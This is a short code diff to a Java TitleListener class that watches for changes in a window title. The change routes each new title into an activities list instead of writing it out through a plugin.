@@ -21,8 +21,7 @@ public class TitleListener implements Runnable {
 					String title = Native.toString(BUFFER);
 					
 					if (latest == null || latest != null && !title.equals(latest)) {
-						Plugin.writeChars("-c TITLE".toCharArray());
-						Plugin.writeChars(("-c " + title).toCharArray());
+						Activities.add(new Title(title));
 					}
 					
 					latest = title;				
